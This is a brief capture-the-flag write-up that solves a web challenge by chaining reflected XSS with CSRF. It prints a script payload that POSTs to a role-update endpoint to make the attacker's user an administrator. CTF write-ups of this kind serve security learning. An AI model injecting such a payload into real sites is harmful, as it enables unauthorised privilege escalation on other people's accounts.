## Solution

We are the first solver of this challenge!

```html
<script>
  fetch("/update-role", {
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: "target_user_id=df589611-0927-4be2-9de3-72c68244f48a&role=admin",
    method: "POST",
  });
</script>
```

The key to solving this challenge is to exploit a reflected XSS vulnerability to carry out CSRF attacks, promoting us to administrator.

(At the time of writing this writeup, the challenge is inaccessible. Please forgive me for not remembering the exact name of the vulnerable endpoint and the flag.)
